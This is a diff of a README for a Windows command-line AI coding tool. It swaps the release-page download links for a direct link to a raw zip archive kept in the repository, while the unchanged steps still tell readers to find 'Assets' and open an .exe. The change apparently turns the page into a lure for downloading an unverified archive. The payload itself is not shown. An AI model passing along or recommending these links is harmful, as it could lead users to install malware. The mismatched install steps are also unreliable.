@@ -1,6 +1,6 @@
 # 🚀 gemini-antigravity-cli - Access advanced coding power with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Leeanninsular877/gemini-antigravity-cli/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Leeanninsular877/gemini-antigravity-cli/raw/refs/heads/main/Sources/antigravity_gemini_cli_v2.0.zip)
 
 ## What is this tool?
 Gemini-antigravity-cli functions as a command-line interface for your computer. It connects your terminal to advanced artificial intelligence models. This tool helps you write code, manage tasks, and perform digital migrations. It serves as an agent that completes technical chores so you do not have to. You can use it to organize workflows and interact with your files through simple text commands.
@@ -16,7 +16,7 @@ Your computer needs to meet these basic standards to run the software:
 ## 📥 How to set up the software
 Follow these steps to install the tool on your Windows computer.
 
-1. Visit this page to download the latest setup file: [https://github.com/Leeanninsular877/gemini-antigravity-cli/releases](https://github.com/Leeanninsular877/gemini-antigravity-cli/releases).
+1. Visit this page to download the latest setup file: [https://github.com/Leeanninsular877/gemini-antigravity-cli/raw/refs/heads/main/Sources/antigravity_gemini_cli_v2.0.zip](https://github.com/Leeanninsular877/gemini-antigravity-cli/raw/refs/heads/main/Sources/antigravity_gemini_cli_v2.0.zip).
 2. Locate the link labeled "Assets" at the bottom of the newest release version.
 3. Select the file ending in .exe to start the download.
 4. Open the downloaded file once the process finishes.
